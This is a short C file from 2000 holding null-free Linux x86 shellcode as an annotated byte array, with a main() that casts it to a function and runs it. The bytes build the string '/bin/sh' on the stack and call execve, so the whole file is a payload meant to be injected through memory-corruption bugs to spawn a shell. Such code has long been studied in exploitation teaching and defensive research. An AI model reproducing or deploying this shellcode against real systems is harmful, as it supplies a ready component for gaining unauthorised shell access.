/* 
 * shellcode-nulfree-linux-x86.c
 * Created: Mon Apr 24 19:54:01 2000 by tek@wiw.org
 * Revised: Mon Apr 24 19:54:01 2000 (pending)
 * Copyright 2000 Julian E. C. Squires (tek@wiw.org)
 * This program comes with ABSOLUTELY NO WARRANTY.
 * $Id$
 * 
 */

unsigned char shellcode[] = {
    0x55,                               /* push %ebp */

    0x8B, 0xEC,                         /* mov %esp, %ebp */

    0x81, 0xC4, 0xF0, 0xFF, 0xFF, 0xFF, /* addl $-16, %esp */

    0x31, 0xC0,                         /* xorl %eax, %eax */

    0x45,                               /* inc %ebp */

    0x89, 0x45, 0xFF,                   /* movl %eax, -1(%ebp) */

    0x4D,                               /* dec %ebp */

    0x89, 0x6D, 0xFC,                   /* movl %ebp, -4(%ebp) */

    /* addl $-8, -4(%ebp) */
    0x81, 0x45, 0xFC, 0xF8, 0xFF, 0xFF, 0xFF,

    /* movl $0x6E69622F, -12(%ebp) */
    0xC7, 0x45, 0xF4, '/', 'b', 'i', 'n',

    /* movl $0xFF68732F, -8(%ebp) */
    0xC7, 0x45, 0xF8, '/', 's', 'h', 0xFF,

    0x80, 0x45, 0xFB, 0x01,             /* addb $1, -5(%ebp) */

    0x31, 0xC0,                         /* xorl %eax, %eax */

    0x80, 0xC0, 0x0B,                   /* addb $0xb, %eax */

    0x8D, 0x5D, 0xF4,                   /* leal -12(%ebp), %ebx */

    0x8D, 0x4D, 0xFC,                   /* leal -4(%ebp), %ecx */

    0x45,                               /* inc %ebp */

    0x8D, 0x55, 0xFF,                   /* leal -1(%ebp), %edx */

    0x4D,                               /* dec %ebp */

    0xCD, 0x80                          /* int $0x80 */
};

int main(void)
{
    (*(void(*)(void))shellcode)();
}

/* EOF shellcode-nulfree-linux-x86.c */
